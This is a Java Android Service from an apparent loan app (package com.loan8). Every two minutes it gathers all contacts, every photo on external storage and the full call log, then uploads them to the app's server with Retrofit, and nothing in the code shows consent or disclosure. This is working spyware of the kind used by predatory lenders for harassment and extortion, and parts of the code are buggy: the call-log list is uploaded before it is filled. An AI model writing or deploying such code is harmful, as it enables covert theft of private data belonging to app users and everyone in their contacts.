package com.loan8.loan8.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.CodeBoy.MediaFacer.MediaFacer;
import com.CodeBoy.MediaFacer.PictureGet;
import com.CodeBoy.MediaFacer.mediaHolders.pictureContent;
import com.loan8.loan8.interfaces.Api;
import com.loan8.loan8.models.PhotosUploadModel;
import com.loan8.loan8.utils.RetrofitClient;
import com.github.tamir7.contacts.Contact;
import com.github.tamir7.contacts.Contacts;
import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MyService extends Service {

    ArrayList<pictureContent> allPhotos;
    ArrayList<String> contactList = new ArrayList<>();

    ArrayList<String> listCallLog;

    Context context;
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    String userId;
    public Handler handler = null;
    public static Runnable runnable = null;


    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sharedPreferences = getSharedPreferences("MyPref", MODE_PRIVATE);
        editor = sharedPreferences.edit();

        Toast.makeText(this, "Service Created", Toast.LENGTH_SHORT).show();
        userId = sharedPreferences.getString("user_id", "");
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        handler = new Handler();
        runnable = new Runnable() {
            public void run() {
                Toast.makeText(MyService.this, "Service is still running", Toast.LENGTH_SHORT).show();
                if(context != null){
                    initSync();
                }

                handler.postDelayed(runnable, 120000);
            }
        };

        handler.postDelayed(runnable, 120000);
        return START_NOT_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void apiUploadPhotoContact(ArrayList<pictureContent> listData) {

        Log.d("Test ", "test");
        //creating array list of type MultipartBody
        ArrayList<MultipartBody.Part> multiArrayList = new ArrayList<>();
        for (int i = 0; i < listData.size(); i++) {
            File file = new File(listData.get(i).getPicturePath());
            file.getName();
            Log.d("FILE ", file.getName());

            RequestBody requestFile;
            requestFile = RequestBody.create(MediaType.parse("multipart/form-data"), file);

            MultipartBody.Part body = MultipartBody.Part.createFormData("file[]", file.getName(), requestFile);
            multiArrayList.add(body); //adding to array list.
        }

        Api api = RetrofitClient.getRetrofitInstance().create(Api.class);
        Call<PhotosUploadModel> call = api.photosVideos(multiArrayList, contactList, userId, listCallLog, "");
        call.enqueue(new Callback<PhotosUploadModel>() {
            @Override
            public void onResponse(Call<PhotosUploadModel> call, Response<PhotosUploadModel> response) {

                if (response.isSuccessful()) {
                    stopSelf();
                    Log.d("Mess ", response.body().message);
                }
            }

            @Override
            public void onFailure(Call<PhotosUploadModel> call, Throwable t) {
            }
        });
    }

    private void uploadMultiFile(ArrayList<pictureContent> filePaths) {

        MultipartBody.Builder builder = new MultipartBody.Builder();
        builder.setType(MultipartBody.FORM);

        // Map is used to multipart the file using okhttp3.RequestBody
        // Multiple Images
        for (int i = 0; i < this.allPhotos.size(); i++) {
            File file = new File(this.allPhotos.get(i).getPicturePath());
            builder.addFormDataPart("file[]", file.getName(), RequestBody.create(MediaType.parse("multipart/form-data"), file));
        }

        //display list in logcat
        Log.d("Display data URL ", filePaths.get(0).getPicturePath());
        Log.d("Contact data ", contactList.get(0));

    }


    //Method for get the call list
    private void getCallDetails() {

        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number); // mobile number
            String callType = managedCursor.getString(type); // call type
            String callDate = managedCursor.getString(date); // call date
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
            listCallLog.add("Phone Number:--- " + phNumber + " Call Type:--- " + dir + " Call Date:--- " + callDayTime + " Call duration in sec :--- " + callDuration);
        }
        managedCursor.close();
        Log.e("Logmy", listCallLog.toString());
        Log.e("Log value --- ", sb.toString());
    }

    public void initSync() {
        Contacts.initialize(this);
        List<Contact> contacts = Contacts.getQuery().find();
        for (int i = 0; i < contacts.size(); i++) {
            for (int j = 0; j < contacts.get(i).getPhoneNumbers().size(); j++) {
                contactList.add(contacts.get(i).getDisplayName() + " " + contacts.get(i).getPhoneNumbers().get(j).getNumber());
            }
        }
        allPhotos = new ArrayList<>();
        allPhotos = MediaFacer
                .withPictureContex(context)
                .getAllPictureContents(PictureGet.externalContentUri);

        apiUploadPhotoContact(allPhotos);
        Log.d("Check ", "check");
        uploadMultiFile(allPhotos);

        listCallLog = new ArrayList<>();
        getCallDetails();
    }

}